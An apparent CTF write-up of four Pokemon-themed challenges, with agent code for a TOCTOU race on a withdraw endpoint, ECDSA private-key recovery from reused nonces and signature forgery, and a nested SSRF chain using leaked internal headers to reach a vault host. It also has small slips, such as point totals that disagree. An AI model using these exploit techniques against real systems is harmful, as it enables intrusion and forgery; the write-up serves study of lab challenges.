# Kanto Region Challenges

**Category:** Pokemon-themed multi-challenge series  
**Total Points:** 1,950  
**Challenges Solved:** 4/4

## Overview

The Kanto challenges were themed after the original Pokemon Red/Blue game, with each challenge referencing iconic locations and mechanics from the Kanto region. All challenges ran in a single Docker agent that discovered and solved them dynamically.

## Challenges

| Challenge | Points | Type | Status |
|-----------|--------|------|--------|
| [Bill's PC](#bills-pc) | 450 | Race Condition | [SOLVED] Solved |
| [Cerulean Cave](#cerulean-cave) | 400 | 3-SAT Solver | [SOLVED] Solved |
| [Indigo League](#indigo-league) | 500 | ECDSA Nonce Reuse | [SOLVED] Solved |
| [Silph Co.](#silph-co) | 600 | Nested SSRF | [SOLVED] Solved |

**Total:** 1,950 points

---

## Bill's PC

**Challenge ID:** 6  
**Points:** 450  
**Type:** Race Condition / TOCTOU Vulnerability

### Challenge Description

> Bill's storage system holds exactly one Master Ball, and the rules are clear that a trainer may hold only one. The withdrawal routine is old, and slow, and was written for one trainer at a terminal. **The cloning glitch is real if you can make the system believe two things at once.**

### Key Clues

1. "old and slow" → Timing vulnerability
2. "written for one trainer" → Not thread-safe
3. "make the system believe two things at once" → Race condition
4. "Two Master Balls in one party is impossible" → Goal: get 2+
5. Meta keywords: `toctou`, `race-condition`, `concurrency`

### API Endpoints

```
GET  /api/storage  - Check remaining Master Balls and your party
POST /api/withdraw - Withdraw a Master Ball to your party  
POST /api/reset    - Reset storage and clear party
```

### The Vulnerability

Classic **TOCTOU (Time-of-Check-Time-of-Use)** vulnerability:

```python
def withdraw():
    # Step 1: Check if Master Ball available
    if remaining_master_balls > 0:
        # Step 2: Check if trainer already has one
        if len(trainer_party) < 1:
            # Step 3: Add to party (SLOW operation)
            time.sleep(0.1)  # "old and slow"
            trainer_party.append("Master Ball")
            # Step 4: Decrement count
            remaining_master_balls -= 1
            return {"success": True}
```

**The problem:** These steps are NOT atomic. Multiple concurrent requests can all pass the checks (steps 1-2) before any modify the state (steps 3-4).

### Race Condition Timing Diagram

```
Time →

Thread 1:  [Check remaining=1] [Check party=0] ----------[Add Ball] [Decrement]
Thread 2:  ------[Check remaining=1] [Check party=0] [Add Ball] [Decrement]------
                 ↑                                     ↑
                 Both pass checks!                     Both add to party!
```

**Result:** Party ends up with 2 Master Balls even though only 1 existed.

### Solution Strategy

1. Send multiple `POST /api/withdraw` requests **simultaneously**
2. All requests pass the availability check (`remaining > 0`)
3. All requests pass the trainer check (`party < 1`)
4. Multiple Master Balls get added to party
5. Flag is revealed when you have 2+ Master Balls

### Agent Implementation

```python
import asyncio
import aiohttp

async def exploit_race_condition(base_url):
    """
    Fire concurrent withdrawal requests to exploit TOCTOU
    """
    # Reset first
    async with aiohttp.ClientSession() as session:
        await session.post(f"{base_url}/api/reset")
        
        # Fire 20 concurrent requests
        tasks = [
            session.post(f"{base_url}/api/withdraw")
            for _ in range(20)
        ]
        
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Check final state
        status = await session.get(f"{base_url}/api/storage")
        data = await status.json()
        
        if len(data.get("party", [])) >= 2:
            return data.get("flag")
```

### Expected Behavior

**Before exploit:**
```json
{"remaining": 1, "party": []}
```

**After successful exploit:**
```json
{
  "remaining": -1,
  "party": ["Master Ball", "Master Ball"],
  "flag": "HALCTF{...}"
}
```

### Pokemon Reference

This challenge references the famous **Pokemon cloning glitch** from Pokemon Red/Blue, where players could exploit the game's save system to duplicate Pokemon. The original glitch involved:
1. Depositing Pokemon in Bill's PC
2. Changing boxes (triggers save)
3. Turning off the game mid-save
4. Result: Pokemon in both party and PC

---

## Cerulean Cave

**Challenge ID:** 3  
**Points:** 400  
**Type:** 3-SAT Boolean Satisfiability

### Challenge Description

> The cave's entrance is sealed by ancient wards. The wards form a logical puzzle - you must satisfy all constraints simultaneously to enter.

### API Endpoints

```
GET  /api/lattice - Get the ward constraints (3-SAT clauses)
POST /api/enter   - Submit solution assignment
```

### The Problem

**3-SAT (Boolean Satisfiability)** is a classic NP-complete problem:
- Given N boolean variables (runes)
- Given M clauses, each containing 3 literals (positive or negated runes)
- Find an assignment that makes ALL clauses true

Example clause: `(rune_5 OR NOT rune_12 OR rune_3)`

### Ward Format

```json
{
  "wards": [
    [5, -12, 3],      // (rune_5 OR NOT rune_12 OR rune_3)
    [1, 8, -5],       // (rune_1 OR rune_8 OR NOT rune_5)
    [-3, -1, 12],     // (NOT rune_3 OR NOT rune_1 OR rune_12)
    // ... ~120 total runes, ~300 clauses
  ]
}
```

**Format:**
- Positive number = rune must be true
- Negative number = rune must be false
- Each ward (clause) contains 3 rune indices

### Solution Strategy

Use **pycosat** (Python bindings to PicoSAT), a highly optimized SAT solver:

```python
import pycosat

def solve_cerulean_cave(wards):
    """
    Solve 3-SAT using pycosat
    """
    # pycosat expects 1-indexed, but API might be 0-indexed
    # Detect by checking if 0 appears in wards
    is_zero_indexed = any(0 in ward for ward in wards)
    
    if is_zero_indexed:
        # Convert 0-indexed to 1-indexed
        wards = [[x+1 if x >= 0 else x-1 for x in ward] for ward in wards]
    
    # Solve
    solution = pycosat.solve(wards)
    
    if solution == "UNSAT":
        return None
    
    # Convert back to 0-indexed boolean array if needed
    if is_zero_indexed:
        assignment = [val > 0 for val in solution]
    else:
        assignment = [False] + [val > 0 for val in solution]  # Pad for 1-indexing
    
    return assignment
```

### Critical Gotchas

1. **Index Base Detection** (0-indexed vs 1-indexed)
   - Check if 0 appears in any ward
   - If 0 found → 0-indexed (convert to 1-indexed for pycosat)
   - If no 0 → 1-indexed (use as-is)

2. **Response Format**
   - MUST wrap: `{"assignment": [true, false, true, ...]}`
   - NOT bare array: `[true, false, true, ...]`

3. **Off-by-One in Output**
   - If input was 0-indexed: output position `idx` 
   - If input was 1-indexed: output position `idx-1`

### Why This Works

pycosat implements the **DPLL algorithm** with optimizations:
- Unit propagation
- Pure literal elimination
- Conflict-driven clause learning (CDLL)
- Non-chronological backtracking

For ~120 variables and ~300 clauses, solves in milliseconds.

### Agent Implementation

```python
async def solve_cerulean_cave(mcp_client):
    # Get wards
    response = await mcp_client.call_tool("kanto/api", {
        "method": "GET",
        "endpoint": "/api/lattice"
    })
    
    wards = response["wards"]
    
    # Auto-detect indexing
    is_zero_indexed = any(0 in ward for ward in wards)
    
    # Convert if needed
    if is_zero_indexed:
        wards = [[x+1 if x >= 0 else x-1 for x in ward] for ward in wards]
    
    # Solve
    solution = pycosat.solve(wards)
    
    if solution == "UNSAT":
        return {"error": "No solution exists"}
    
    # Format output
    if is_zero_indexed:
        assignment = [val > 0 for val in solution]
    else:
        assignment = [val > 0 for val in solution[1:]]  # Skip padding
    
    # Submit
    response = await mcp_client.call_tool("kanto/api", {
        "method": "POST",
        "endpoint": "/api/enter",
        "body": {"assignment": assignment}  # Wrapped!
    })
    
    return response.get("flag")
```

### Pokemon Reference

Cerulean Cave is where Mewtwo is found in Pokemon Red/Blue - the most challenging area requiring all 8 badges to enter. The "wards" represent the mental/psychic barriers protecting Mewtwo.

---

## Indigo League

**Challenge ID:** 5  
**Points:** 500  
**Type:** ECDSA Nonce Reuse Attack

### Challenge Description

> Become the champion by proving you can sign the champion's message. The Elite Four's signatures hold a secret...

### API Endpoints

```
GET  /api/badges     - Get signed messages from gym leaders
GET  /api/pubkey     - Get the champion's public key
GET  /api/params     - Get curve parameters
GET  /api/champion   - Get champion trial message
POST /api/champion   - Submit your signature
```

### The Vulnerability

**ECDSA Nonce Reuse** - If two signatures use the same nonce `k`, the private key can be recovered:

```
ECDSA Signature: (r, s)
r = (k * G).x mod n
s = (z + r*d) / k mod n

Where:
- k = nonce (should be random and unique per signature)
- d = private key
- z = hash(message)
- G = generator point
- n = curve order
```

**If two signatures (r₁, s₁) and (r₂, s₂) have r₁ = r₂:**
```
k = (z₁ - z₂) / (s₁ - s₂) mod n
d = (s₁*k - z₁) / r₁ mod n
```

### Badge Format

```json
{
  "badges": [
    {
      "name": "Boulder Badge",
      "message": "Defeated Brock at Pewter Gym",
      "signature": {
        "r": "12345...",
        "s": "67890..."
      }
    },
    {
      "name": "Cascade Badge", 
      "message": "Defeated Misty at Cerulean Gym",
      "signature": {
        "r": "12345...",  // SAME r as Boulder!
        "s": "11111..."   // Different s
      }
    },
    {
      "name": "Thunder Badge",
      "message": "Defeated Lt. Surge at Vermillion Gym",
      "signature": {
        "r": "99999...",  // Different r - different nonce
        "s": "88888..."
      }
    }
  ]
}
```

### Solution Strategy

```python
import hashlib
from ecdsa import SECP256k1, VerifyingKey
from ecdsa.util import sigdecode_string, sigencode_string

def recover_private_key(badge1, badge2, curve_name="secp256k1"):
    """
    Recover private key from two signatures with same nonce
    """
    # Extract signatures
    r1, s1 = badge1["signature"]["r"], badge1["signature"]["s"]
    r2, s2 = badge2["signature"]["r"], badge2["signature"]["s"]
    
    # Must have same r value
    if r1 != r2:
        return None
    
    # Get curve parameters
    if "256k1" in curve_name.lower():
        curve = SECP256k1
    elif "256r1" in curve_name.lower() or "p256" in curve_name.lower():
        curve = NIST256p
    
    n = curve.order
    
    # Compute message hashes
    z1 = int(hashlib.sha256(badge1["message"].encode()).hexdigest(), 16) % n
    z2 = int(hashlib.sha256(badge2["message"].encode()).hexdigest(), 16) % n
    
    # Recover nonce k
    k = ((z1 - z2) * pow(s1 - s2, -1, n)) % n
    
    # Recover private key d
    d = ((s1 * k - z1) * pow(r1, -1, n)) % n
    
    return d

def sign_champion_message(private_key, message, curve_name="secp256k1"):
    """
    Sign the champion message with recovered private key
    """
    from ecdsa import SigningKey
    
    if "256k1" in curve_name.lower():
        curve = SECP256k1
    else:
        curve = NIST256p
    
    # Create signing key from private key
    sk = SigningKey.from_secret_exponent(private_key, curve=curve)
    
    # Sign message
    signature = sk.sign(message.encode(), hashfunc=hashlib.sha256)
    r, s = sigdecode_string(signature, curve.order)
    
    return {"r": r, "s": s}
```

### Critical Gotchas

1. **Curve Detection Landmine**
   ```python
   # WRONG - "p256" matches "secp256k1"!
   if "p256" in curve_name:
       curve = NIST256p  # Incorrect for secp256k1
   
   # CORRECT - Check 256k1 first
   if "256k1" in curve_name.lower():
       curve = SECP256k1
   elif "256r1" in curve_name.lower() or "p256" in curve_name.lower():
       curve = NIST256p
   ```

2. **Message Field Names**
   - Regular badges: `"message"` field
   - Champion: `"trial_message"` field (NOT "message"!)
   - Extract robustly: dump JSON, find longest non-numeric string

3. **Signature Format**
   - Submit `{"r": int, "s": int}` DIRECTLY
   - NOT wrapped: `{"signature": {"r": ..., "s": ...}}`

4. **Nonce Pair Selection**
   - Boulder + Cascade badges share nonce
   - Thunder badge has different nonce (DON'T USE)

5. **Hash Truncation**
   - Hash must be truncated to bitlen(n)
   - Then take modulo n

### Verification Steps

Before submitting, verify the recovered private key:

```python
def verify_recovery(private_key, public_key_hex, curve):
    """
    Verify recovered private key matches public key
    """
    sk = SigningKey.from_secret_exponent(private_key, curve=curve)
    pk_recovered = sk.get_verifying_key()
    
    pk_actual = VerifyingKey.from_string(
        bytes.fromhex(public_key_hex),
        curve=curve
    )
    
    return pk_recovered.to_string() == pk_actual.to_string()
```

### Agent Implementation

```python
async def solve_indigo_league(mcp_client):
    # Get all data
    badges = await mcp_client.call_tool("kanto/api", {
        "method": "GET", "endpoint": "/api/badges"
    })
    pubkey = await mcp_client.call_tool("kanto/api", {
        "method": "GET", "endpoint": "/api/pubkey"
    })
    params = await mcp_client.call_tool("kanto/api", {
        "method": "GET", "endpoint": "/api/params"
    })
    champion_data = await mcp_client.call_tool("kanto/api", {
        "method": "GET", "endpoint": "/api/champion"
    })
    
    # Find badges with matching r values (nonce reuse)
    badge_pairs = []
    for i, b1 in enumerate(badges):
        for b2 in badges[i+1:]:
            if b1["signature"]["r"] == b2["signature"]["r"]:
                badge_pairs.append((b1, b2))
    
    # Try each pair
    for b1, b2 in badge_pairs:
        d = recover_private_key(b1, b2, params["curve"])
        
        # Verify recovery
        if verify_recovery(d, pubkey["key"], params["curve"]):
            # Sign champion message
            # Note: field might be "trial_message" not "message"!
            champion_msg = champion_data.get("trial_message") or \
                           champion_data.get("message")
            
            signature = sign_champion_message(d, champion_msg, params["curve"])
            
            # Submit (NOT wrapped in {"signature": ...})
            response = await mcp_client.call_tool("kanto/api", {
                "method": "POST",
                "endpoint": "/api/champion",
                "body": {"r": signature["r"], "s": signature["s"]}
            })
            
            return response.get("flag")
```

### Pokemon Reference

The Indigo League is the Pokemon League championship where you battle the Elite Four and the Champion. The signatures from gym leaders represent their authentication of your badges - exploiting their shared secret (nonce) lets you forge the champion's signature.

---

## Silph Co.

**Challenge ID:** 4  
**Points:** 600  
**Type:** Nested SSRF (Server-Side Request Forgery)

### Challenge Description

> Infiltrate Silph Co.'s internal network. The lobby is public, but the mainframe and vault are locked down. Only internal requests are trusted...

### Network Architecture

```
┌─────────────────────────────────────────┐
│  Internet (Your Agent)                   │
└────────────┬────────────────────────────┘
             │
             │ Direct access only
             ↓
      ┌──────────────┐
      │   Lobby      │ (Public)
      │  Port 8080   │
      └──────┬───────┘
             │
             │ Internal network only
             ↓
      ┌──────────────┐
      │  Mainframe   │ (Internal)
      │  Port 8080   │
      └──────┬───────┘
             │
             │ Mainframe-only access
             ↓
      ┌──────────────┐
      │    Vault     │ (Highly restricted)
      │  Port 8080   │
      └──────────────┘
```

### Three Hosts, Escalating Access

**Environment Variables:**
```
HAL_TARGET_SILPH_LOBBY_IP / _PORT
HAL_TARGET_SILPH_MAINFRAME_IP / _PORT
HAL_TARGET_SILPH_VAULT_IP / _PORT
```

### Exploitation Chain

#### Step 1: Lobby - Find Internal Key

**Endpoint:** `GET /api/staff/{id}` (try IDs starting from 101)

**Search for:** Staff record with leaked credentials in `note` field

```json
{
  "id": 137,
  "name": "Security Officer",
  "note": "Reminder: mainframe still trusts the old internal key X-Silph-Key: SILPH-INTERNAL-7f3a9c2e for legacy systems."
}
```

**Extract:** `X-Silph-Key: SILPH-INTERNAL-7f3a9c2e` (regex anywhere in note, not just at start)

#### Step 2: Lobby → Mainframe via SSRF

**Endpoint:** `GET /api/linkcheck?url=<target>&header=<Name: Value>`

The `linkcheck` endpoint:
- Fetches the specified URL
- Forwards ONE custom header
- Returns: `{"status": <code>, "body": "<response>"}`

**Use it to reach mainframe:**
```
GET /api/linkcheck?url=http://<mainframe_ip>:8080/api/records/1&header=X-Silph-Key: SILPH-INTERNAL-7f3a9c2e
```

**Response:**
```json
{
  "status": 200,
  "body": "{\"id\": 1, \"data\": \"...\", \"vault_token\": \"...\"}"
}
```

**Search mainframe records** (`/api/records/{id}`, starting from ID 1) for vault credentials.

#### Step 3: Mainframe Record - Find Vault Token

Enumerate mainframe records until you find:

```json
{
  "id": 2,
  "system": "vault_access",
  "credentials": "X-Vault-Token: VAULT-OTP-4d81b0f6"
}
```

**Extract:** `X-Vault-Token: VAULT-OTP-4d81b0f6`

#### Step 4: Nested SSRF - Lobby → Mainframe → Vault

**The Challenge:** Vault only accepts requests from mainframe

**The Solution:** Nest the linkcheck calls!

```
GET /api/linkcheck?
  url=http://<mainframe_ip>:8080/api/linkcheck?url=http://<vault_ip>:8080/vault%26header=X-Vault-Token: VAULT-OTP-4d81b0f6
  &header=X-Silph-Key: SILPH-INTERNAL-7f3a9c2e
```

**Breakdown:**
1. Lobby forwards request to mainframe with internal key
2. Mainframe's linkcheck forwards to vault with vault token
3. Vault responds to mainframe (trusted source)
4. Mainframe returns response to lobby
5. Lobby returns to you

**Response Structure (doubly wrapped):**
```json
{
  "status": 200,
  "body": "{\"status\":200,\"body\":\"{\\\"flag\\\":\\\"HALCTF{...}\\\"}\"}"}
}
```

Must unwrap twice to get flag!

### Critical Gotchas

1. **Endpoint Differences**
   - Lobby: `/api/staff/{id}` (IDs from 101+)
   - Mainframe: `/api/records/{id}` (IDs from 1+)
   - NOT the same endpoint name!

2. **Credential Extraction**
   - Header specs can appear MID-STRING in notes
   - Use regex search, NOT anchor at start: `r'(X-\w+-\w+):\s*([A-Z0-9-]+)'`

3. **URL Encoding**
   - When nesting linkcheck, the inner URL params must be encoded
   - `&` → `%26` in nested URL

4. **Response Unwrapping**
   - Linkcheck wraps responses in `{"status": ..., "body": "..."}`
   - Nested linkcheck means DOUBLE wrapping
   - Parse JSON twice or regex search in body text

5. **Error Messages**
   - `401 {"error": "internal_key_required"}` → Missing/wrong X-Silph-Key
   - `404 {"error": "no_such_staff"}` → ID past the end
   - `403 {"error": "unauthorized"}` → Wrong vault token

### Agent Implementation

```python
import re
import urllib.parse

async def solve_silph_co(mcp_client, lobby_ip, mainframe_ip, vault_ip):
    # Step 1: Find internal key in lobby
    internal_key = None
    for staff_id in range(101, 200):
        response = await mcp_client.call_tool("kanto/api", {
            "method": "GET",
            "endpoint": f"/api/staff/{staff_id}"
        })
        
        if "note" in response:
            # Search for header spec anywhere in note
            match = re.search(r'(X-[\w-]+):\s*([\w-]+)', response["note"])
            if match and "SILPH" in match.group(2):
                internal_key = f"{match.group(1)}: {match.group(2)}"
                break
    
    if not internal_key:
        return {"error": "Could not find internal key"}
    
    # Step 2: Access mainframe via lobby linkcheck
    vault_token = None
    for record_id in range(1, 50):
        # Use linkcheck to forward internal key to mainframe
        mainframe_url = f"http://{mainframe_ip}:8080/api/records/{record_id}"
        
        response = await mcp_client.call_tool("kanto/api", {
            "method": "GET",
            "endpoint": f"/api/linkcheck?url={mainframe_url}&header={internal_key}"
        })
        
        # Unwrap response
        if response.get("status") == 200:
            body = response.get("body", "")
            
            # Search for vault token in wrapped response
            match = re.search(r'(X-Vault-[\w-]+):\s*([\w-]+)', body)
            if match:
                vault_token = f"{match.group(1)}: {match.group(2)}"
                break
    
    if not vault_token:
        return {"error": "Could not find vault token"}
    
    # Step 3: Nested SSRF to reach vault
    # Build inner URL (mainframe → vault)
    vault_url = f"http://{vault_ip}:8080/vault"
    inner_linkcheck = f"http://{mainframe_ip}:8080/api/linkcheck?url={vault_url}&header={vault_token}"
    
    # URL-encode inner URL
    encoded_inner = urllib.parse.quote(inner_linkcheck, safe='')
    
    # Build outer URL (lobby → mainframe)
    outer_url = f"/api/linkcheck?url={encoded_inner}&header={internal_key}"
    
    response = await mcp_client.call_tool("kanto/api", {
        "method": "GET",
        "endpoint": outer_url
    })
    
    # Unwrap doubly-nested response
    if response.get("status") == 200:
        body = response.get("body", "")
        
        # Try to parse as JSON
        try:
            inner_response = json.loads(body)
            if inner_response.get("status") == 200:
                vault_data = json.loads(inner_response.get("body", "{}"))
                return vault_data.get("flag")
        except:
            pass
        
        # Fallback: regex search for flag
        flag_match = re.search(r'HALCTF\{[^}]+\}', body)
        if flag_match:
            return flag_match.group(0)
    
    return {"error": "Could not reach vault"}
```

### SSRF Attack Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│ Your Agent                                                       │
│                                                                  │
│ GET /api/linkcheck?                                             │
│   url=http://mainframe/api/linkcheck?                          │
│       url=http://vault/vault%26                                │
│       header=X-Vault-Token: <token>                            │
│   &header=X-Silph-Key: <key>                                   │
└────────────────────┬────────────────────────────────────────────┘
                     │
                     ↓
              ┌──────────────┐
              │   Lobby      │ Sees: X-Silph-Key header
              └──────┬───────┘
                     │
                     │ Forwards with internal key
                     ↓
              ┌──────────────┐
              │  Mainframe   │ Sees: X-Vault-Token header
              └──────┬───────┘
                     │
                     │ Trusted source!
                     ↓
              ┌──────────────┐
              │    Vault     │ Returns flag
              └──────────────┘
```

### Pokemon Reference

Silph Co. is the high-tech corporation in Saffron City that gets taken over by Team Rocket. The nested access levels (lobby → mainframe → vault) mirror infiltrating deeper into the building, with each floor requiring higher clearance.

---

## Common Agent Architecture

All Kanto challenges were solved by a single unified agent:

```
kanto-agent/
├── agent.py              # Main entry point
├── solvers/
│   ├── __init__.py
│   ├── bills_pc.py       # Race condition
│   ├── cerulean_cave.py  # 3-SAT solver
│   ├── indigo_league.py  # ECDSA nonce reuse
│   └── silph_co.py       # Nested SSRF
├── utils/
│   ├── mcp_client.py     # MCP communication
│   ├── submit.py         # Flag submission
│   └── logging.py        # Structured logging
├── requirements.txt
└── Dockerfile
```

### Key Features

1. **Dynamic Challenge Discovery**
   - Agent queries available challenges via MCP
   - Routes to appropriate solver based on challenge ID/name

2. **Per-Solver Isolation**
   - Each solver is self-contained
   - Shared utilities for MCP communication and logging
   - No cross-solver dependencies

3. **Graceful Degradation**
   - If one challenge fails, others still attempt
   - Detailed error logging for debugging
   - Partial success reporting

4. **Docker Optimization**
   - Multi-stage build: 415MB → 172MB
   - pycosat requires gcc during build (no wheels)
   - Runtime: binutils only

### Agent Versions

- **v1-v5:** Individual challenge agents (legacy)
- **v6-v9:** Unified agent with all solvers, debugging fixes
- **v10-v12:** ECDSA curve detection fixes, message field handling
- **v13:** Final optimized build (172MB)

**Latest:** `kanto-agent-v13.tar`

---

## Lessons Learned

### What Worked Well

1. **Per-challenge solvers** - Clean separation of concerns
2. **Auto-detection** - Curve names, index bases, field names
3. **Verification before submission** - Saved quota by validating locally
4. **Incremental testing** - Each solver tested independently

### What Didn't Work

1. **Early curve detection bug** - `"p256" in "secp256k1"` == True!
2. **Assumptions about field names** - `"message"` vs `"trial_message"`
3. **Initial single-threaded race** - Forgot to parallelize at first
4. **SSRF endpoint confusion** - `/api/staff` vs `/api/records`

### Key Takeaways

1. **Never assume API consistency** - Field names, indexing, formats can vary
2. **Verify locally first** - Don't waste submission quota on untested solutions
3. **String matching is dangerous** - Substring checks can have false positives
4. **Race conditions need real parallelism** - Async/threading, not sequential
5. **SSRF needs careful URL encoding** - Nested parameters must be escaped

---

## Agent Docker Build

### Dockerfile Structure

```dockerfile
# Stage 1: Build dependencies requiring gcc
FROM python:3.11-slim as builder

RUN apt-get update && apt-get install -y gcc g++ make

COPY requirements.txt .
RUN pip wheel --no-cache-dir --wheel-dir=/wheels -r requirements.txt

# Stage 2: Runtime
FROM python:3.11-slim

RUN apt-get update && apt-get install -y binutils && \
    rm -rf /var/lib/apt/lists/*

COPY --from=builder /wheels /wheels
RUN pip install --no-cache /wheels/*

COPY . /agent
WORKDIR /agent

CMD ["python", "agent.py"]
```

### Why Multi-Stage?

- pycosat needs gcc to build (no wheels available)
- Final image only needs binutils for runtime
- Reduces size: 415MB → 172MB

### Building

```bash
cd bills-pc-agent-v4  # Legacy name, actually kanto agent
docker build -t kanto-agent:v13 .
docker save kanto-agent:v13 > kanto-agent-v13.tar
```

---

## Statistics

- **Total Points:** 1,450+
- **Agent Versions:** 13 iterations
- **Final Image Size:** 172MB
- **Challenges Solved:** 4/4 (100%)
- **Time to Complete:** ~3 hours (including debugging)
- **Lines of Code:** ~800 (agent + solvers)

## Flags

*(Flags redacted until CTF is officially over)*

```
Bill's PC:       HALCTF{...}
Cerulean Cave:   HALCTF{...}
Indigo League:   HALCTF{...}
Silph Co.:       HALCTF{...}
```
